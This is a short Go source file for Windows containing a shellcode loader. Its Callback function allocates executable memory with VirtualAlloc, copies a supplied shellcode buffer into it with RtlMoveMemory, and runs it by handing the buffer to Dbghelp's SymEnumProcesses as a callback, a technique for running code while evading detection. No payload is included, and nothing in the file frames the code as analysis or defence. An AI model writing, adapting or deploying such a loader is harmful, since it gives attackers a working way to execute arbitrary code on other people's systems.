package TT

import (
	"syscall"
	"unsafe"
)

var (
	timer int
)

const (
	MEM_COMMIT             = 0x1000
	MEM_RESERVE            = 0x2000
	PAGE_EXECUTE_READWRITE = 0x40
	FALSE                  = 0
)

var (
	kernel32          = syscall.MustLoadDLL("kernel32.dll")
	ntdll             = syscall.MustLoadDLL("ntdll.dll")
	Dbghelp           = syscall.MustLoadDLL("Dbghelp.dll")
	VirtualAlloc      = kernel32.MustFindProc("VirtualAlloc")
	GetCurrentProcess = kernel32.MustFindProc("GetCurrentProcess")
	SymInitialize     = Dbghelp.MustFindProc("SymInitialize")
	SymEnumProcesses  = Dbghelp.MustFindProc("SymEnumProcesses")
	RtlMoveMemory     = ntdll.MustFindProc("RtlMoveMemory")
)

func Callback(shellcode []byte) {
	addr, _, err := VirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
	if err != nil && err.Error() != "The operation completed successfully." {
		syscall.Exit(0)
	}
	RtlMoveMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
	Proces, _, _ := GetCurrentProcess.Call()
	SymInitialize.Call(Proces, 0, FALSE)
	SymEnumProcesses.Call(addr, 0)
}
